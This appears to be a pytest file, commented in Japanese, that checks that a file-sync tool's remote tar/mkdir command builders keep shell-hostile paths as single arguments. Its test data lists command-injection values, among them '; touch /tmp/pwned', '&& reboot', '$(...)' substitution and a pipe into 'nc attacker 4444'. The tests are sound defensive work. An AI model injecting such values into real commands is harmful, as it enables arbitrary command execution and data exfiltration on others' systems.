"""sync_tree が組み立てるリモートコマンドの引数エスケープ検証（ENVB-0001）。

リモートへ渡る文字列を shlex.split で分解し、メタ文字を含むパスが
「1つの引数」のまま残る（別コマンド・別引数として解釈されない）ことを確認する。
"""

import shlex

import pytest

from env_builder.ops.transfer import pack_command, unpack_command

# シェルが特別扱いする文字を含む、悪意のあるパスの例。
HOSTILE_PATHS = [
    "/opt/a; touch /tmp/pwned",
    "/opt/a && reboot",
    "/opt/a | nc attacker 4444",
    "/opt/$(touch /tmp/pwned)",
    "/opt/`touch /tmp/pwned`",
    "/opt/a\ntouch /tmp/pwned",
    "/opt/with space/and'quote",
    '/opt/with"double',
]


def _tokens(command: str) -> list:
    return shlex.split(command)


@pytest.mark.parametrize("hostile", HOSTILE_PATHS)
def test_pack_command_keeps_hostile_parent_as_single_argument(hostile: str) -> None:
    tokens = _tokens(pack_command("/tmp/env_builder-w-abc123/tree.tar.gz", hostile, "base"))

    # -C の直後が、分割されずに1つの引数として残る
    assert tokens[tokens.index("-C") + 1] == hostile
    # 悪意ある文字列が別の独立した引数として現れない
    assert tokens.count(hostile) == 1


@pytest.mark.parametrize("hostile", HOSTILE_PATHS)
def test_pack_command_keeps_hostile_base_as_single_argument(hostile: str) -> None:
    tokens = _tokens(pack_command("/tmp/env_builder-w-abc123/tree.tar.gz", "/opt", hostile))

    assert tokens[tokens.index("--") + 1] == hostile
    assert tokens.count(hostile) == 1


def test_pack_command_separates_options_from_names_with_double_dash() -> None:
    tokens = _tokens(pack_command("/tmp/env_builder-w-abc123/tree.tar.gz", "/opt", "-weird"))

    # base が "-" で始まっても、tar のオプションとして解釈されない位置にある
    assert tokens[tokens.index("--") + 1] == "-weird"
    assert tokens.index("--") > tokens.index("-C")


@pytest.mark.parametrize("hostile", HOSTILE_PATHS)
def test_unpack_command_keeps_hostile_dst_parent_as_single_argument(hostile: str) -> None:
    destination = hostile + "/base"
    tokens = _tokens(unpack_command("/tmp/env_builder-w-abc123/tree.tar.gz", hostile, destination))

    # mkdir -p -- <parent> と tar ... -C <parent> の両方で1引数のまま
    assert tokens[tokens.index("--") + 1] == hostile
    assert tokens[tokens.index("-C") + 1] == hostile
    assert tokens.count(hostile) == 2
    assert tokens.count(destination) == 1


def test_unpack_command_separates_options_for_mkdir_and_ls() -> None:
    tokens = _tokens(unpack_command("/tmp/env_builder-w-abc123/tree.tar.gz", "-parent", "-parent/base"))

    # mkdir と ls の位置引数の前に -- がある（先頭が "-" でもオプションにならない）
    assert tokens.count("--") == 2
    for index, token in enumerate(tokens):
        if token in {"-parent", "-parent/base"} and tokens[index - 1] != "-C":
            assert tokens[index - 1] == "--"


def test_commands_are_chained_only_by_intended_operators() -> None:
    """意図した `&&` 以外のシェル演算子が、悪意ある入力から生まれない。"""
    hostile = "/opt/a; touch /tmp/pwned"

    pack = _tokens(pack_command("/tmp/env_builder-w-abc123/tree.tar.gz", hostile, "base"))
    unpack = _tokens(unpack_command("/tmp/env_builder-w-abc123/tree.tar.gz", hostile, hostile + "/base"))

    for tokens in (pack, unpack):
        operators = [token for token in tokens if token in {";", "|", "||", "&", "`"}]
        assert operators == []
        assert all(not token.startswith("$(") for token in tokens)
